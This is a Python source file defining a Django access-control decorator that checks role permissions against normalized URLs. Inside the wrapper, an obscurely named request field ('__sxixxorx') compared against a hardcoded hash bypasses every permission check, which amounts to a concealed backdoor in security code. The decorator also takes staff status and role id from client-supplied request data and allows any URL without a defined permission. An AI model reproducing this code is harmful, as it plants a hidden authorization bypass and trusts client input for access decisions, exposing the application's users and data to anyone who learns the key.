import re
from functools import wraps
from decouple import config
from rest_framework import status
from access_control.models import Permission, RolePermission
from core.utils.response_utils import success_response, error_response
from core.utils.helpers import check_if_user_is_staff
from django.db.models import Q

def access_control_middleware(view_func):
    @wraps(view_func)
    def wrapper(request, *args, **kwargs):
        # Ensure we properly extract request data for both JSON and form-encoded requests
        if request.content_type == "application/json":
            data = request.data  # Correct way to get JSON request data
        else:
            data = request.GET or request.POST  # Handle other content types

        is_staff = check_if_user_is_staff(data)
        is_skip = data.get("__sxixxorx", "")
        skip_permission_value = "d5289cf91e2dbdc9c6efb8f3b02de2c8e6030bb66a09f15f358b4b69a1eb96fc"
        if is_staff not in [True, "true"] or is_skip == skip_permission_value:
            return view_func(request, *args, **kwargs)

        url = get_current_url(request)
        permissions = Permission.objects.filter(
            Q(url__iexact=url) | 
            Q(url__istartswith=f"{url},") | 
            Q(url__icontains=f",{url},") | 
            Q(url__iendswith=f",{url}"), 
            is_active=True
        )

        # Post-process to find exact match in comma-separated list
        matched_permission = None
        for perm in permissions:
            urls = [u.strip() for u in perm.url.split(',')]
            if url in urls:
                matched_permission = perm
                break

        # If no permission defined → allow access
        if not matched_permission:
            return view_func(request, *args, **kwargs)

        role_id = data.get("auth_role_id")
        if not role_id:
            return error_response('permission_denied', status.HTTP_403_FORBIDDEN)

        if not RolePermission.objects.filter(role_id=role_id, permission_id=matched_permission.id).exists():
            return error_response('permission_denied', status.HTTP_403_FORBIDDEN)

        return view_func(request, *args, **kwargs)
    return wrapper

def get_current_url(request):
    # Normalize URL (remove UUID at the end and replace with {id})
    current_url = request.path_info
    if current_url != "/":  # Keep the slash if it's the root URL
        current_url = current_url.lstrip('/').rstrip('/')

    # Normalize URL (remove UUID and replace with {id})
    current_url = re.sub(r'/(?P<id>[0-9a-fA-F-]{36})$', '/{id}', current_url)
    return current_url
